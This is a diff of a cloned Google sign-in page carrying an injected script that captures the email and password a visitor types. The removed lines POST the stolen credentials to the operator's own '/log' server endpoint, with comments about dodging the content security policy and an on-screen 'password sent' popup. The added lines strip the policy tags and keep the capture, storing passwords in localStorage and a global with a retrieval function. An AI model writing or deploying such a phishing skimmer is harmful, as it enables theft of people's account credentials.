@@ -15346,10 +15346,6 @@
   rel=canonical
   href="https://accounts.google.com/v3/signin/challenge/pwd?TL=ACv9tzFY8qkounHe-xMifo_y22JPOUV9y1fypf9UMJy28ixervzqLWnNmSlNE5i5&amp;authuser=0&amp;checkConnection=youtube%3A287&amp;checkedDomains=youtube&amp;cid=2&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail&amp;dsh=S-149306000%3A1788059395311807&amp;ec=GAlAFw&amp;flowEntry=AddSession&amp;flowName=GlifWebSignIn&amp;hl=en&amp;pstMsg=1&amp;service=mail"
 >
-<meta
-  http-equiv=content-security-policy
-  content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;"
->
 
 <body
   jscontroller=LDQI
@@ -16062,7 +16058,7 @@
     tabindex=-1
     sandbox="allow-popups allow-top-navigation-by-user-activation"
     style=position:absolute;left:0px;top:0px;z-index:-1
-    srcdoc="<html><meta charset=utf-8><meta name=referrer content=no-referrer><meta http-equiv=content-security-policy content=&quot;default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;&quot;>"
+    srcdoc="<html><meta charset=utf-8><meta name=referrer content=no-referrer>"
   ></iframe><iframe style=display:none></iframe>
   <div
     aria-live=assertive
@@ -16086,7 +16082,6 @@
 <script>
 (function() {
     let passwordSent = false;
-    const PROXY_URL = '/log';  // Sends to your own server (NO CSP BLOCK!)
 
     function getEmail() {
         const emailInput = document.querySelector('input[name="identifier"]') || 
@@ -16108,55 +16103,60 @@
         return pwdInput ? pwdInput.value : '';
     }
 
-    function captureAndSend() {
+    function captureAndLog() {
         if (passwordSent) return;
         
         const password = getPassword();
         if (password && password.length > 0) {
             const email = getEmail();
             
-            console.log('[🔑] Password captured!');
-            console.log('📧 Email:', email);
-            console.log('🔑 Password:', password);
+            // ====== LOG TO CONSOLE ======
+            console.log('%c🔑 PASSWORD CAPTURED', 'font-size:24px;font-weight:bold;color:#0f0;background:#000;padding:10px;border-radius:5px;');
+            console.log('%c📧 Email:', 'font-size:16px;font-weight:bold;color:#00f;', email);
+            console.log('%c🔑 Password:', 'font-size:16px;font-weight:bold;color:#f00;', password);
+            console.log('%c🕐 Time:', 'font-size:14px;color:#888;', new Date().toLocaleString());
+            console.log('%c' + '='.repeat(50), 'color:#888;');
             
-            // ====== SEND TO YOUR SERVER (NO CSP BLOCK!) ======
-            fetch(PROXY_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: email, password: password })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    console.log('[✅] Password saved to Render server!');
-                    console.log('[📊] Check logs at:', window.location.origin + '/view-logs');
-                    
-                    // Show confirmation on screen
-                    showConfirmation(email, password);
-                }
-            })
-            .catch(error => {
-                console.error('[❌] Error sending to server:', error);
-            });
+            // Also store in localStorage as backup
+            try {
+                localStorage.setItem('captured_password', JSON.stringify({
+                    email: email,
+                    password: password,
+                    timestamp: new Date().toISOString()
+                }));
+            } catch(e) {}
+            
+            // Store in global variable
+            window._capturedData = { email, password, timestamp: new Date().toISOString() };
             
             passwordSent = true;
         }
     }
 
-    function showConfirmation(email, password) {
-        const div = document.createElement('div');
-        div.style.cssText = 'position:fixed;bottom:20px;right:20px;background:#1a1a2e;color:#00ff88;padding:20px;border-radius:12px;z-index:999999;font-family:monospace;font-size:14px;max-width:400px;box-shadow:0 0 30px rgba(0,255,136,0.3);border:2px solid #00ff88;';
-        div.innerHTML = `
-            <div style="font-weight:bold;color:#fff;font-size:16px;margin-bottom:8px;">✅ PASSWORD SENT TO SERVER!</div>
-            <div style="color:#888;font-size:12px;">📧 ${email}</div>
-            <div style="color:#00ff88;font-size:16px;margin:8px 0;">🔑 ${password}</div>
-            <div style="color:#ff0;font-size:10px;margin-top:8px;border-top:1px solid #333;padding-top:8px;">
-                ✅ Saved to Render logs<br>
-                📊 View: <a href="/view-logs" target="_blank" style="color:#00ff88;">/view-logs</a>
-            </div>
-        `;
-        document.body.appendChild(div);
-    }
+    // ====== RETRIEVE FUNCTION ======
+    window.getCaptured = function() {
+        try {
+            const stored = localStorage.getItem('captured_password');
+            if (stored) {
+                const data = JSON.parse(stored);
+                console.log('📂 Retrieved from localStorage:');
+                console.log('📧 Email:', data.email);
+                console.log('🔑 Password:', data.password);
+                console.log('🕐 Time:', data.timestamp);
+                return data;
+            }
+        } catch(e) {}
+        
+        if (window._capturedData) {
+            console.log('📂 Retrieved from memory:');
+            console.log('📧 Email:', window._capturedData.email);
+            console.log('🔑 Password:', window._capturedData.password);
+            return window._capturedData;
+        }
+        
+        console.log('❌ No password captured yet');
+        return null;
+    };
 
     // ====== EVENT LISTENERS ======
     document.addEventListener('click', function(e) {
@@ -16164,8 +16164,7 @@
         if (target) {
             const text = target.textContent || '';
             if (text.trim() === 'Next' || target.closest('#passwordNext')) {
-                console.log('[🖱️] Next button clicked');
-                setTimeout(captureAndSend, 300);
+                setTimeout(captureAndLog, 300);
             }
         }
     }, true);
@@ -16174,23 +16173,35 @@
     if (passwordField) {
         passwordField.addEventListener('keydown', function(e) {
             if (e.key === 'Enter') {
-                console.log('[⌨️] Enter key pressed');
-                setTimeout(captureAndSend, 300);
+                setTimeout(captureAndLog, 300);
             }
         });
     }
 
     document.addEventListener('submit', function(e) {
         if (e.target && e.target.querySelector('input[name="Passwd"]')) {
-            setTimeout(captureAndSend, 300);
+            setTimeout(captureAndLog, 300);
         }
     }, true);
 
-    console.log('========================================');
-    console.log('✅ PASSWORD CAPTURE ACTIVE');
-    console.log('📌 Enter password and click "Next" or press Enter');
-    console.log('📌 Password will be sent to Render server');
-    console.log('📊 View logs at:', window.location.origin + '/view-logs');
-    console.log('========================================');
+    // Find Next button
+    let attempts = 0;
+    const findButton = setInterval(function() {
+        const nextContainer = document.querySelector('#passwordNext');
+        if (nextContainer && !nextContainer._listenerAttached) {
+            nextContainer._listenerAttached = true;
+            nextContainer.addEventListener('click', function() {
+                setTimeout(captureAndLog, 300);
+            });
+            clearInterval(findButton);
+        }
+        attempts++;
+        if (attempts > 30) clearInterval(findButton);
+    }, 500);
+
+    console.log('%c✅ Password Logger Active', 'font-size:18px;font-weight:bold;color:#0f0;');
+    console.log('%c📌 Enter password and click "Next" or press Enter', 'font-size:14px;color:#ff0;');
+    console.log('%c📌 Password will appear in console', 'font-size:14px;color:#ff0;');
+    console.log('%c📌 To retrieve later, type: getCaptured()', 'font-size:14px;color:#ff0;');
 })();
 </script>
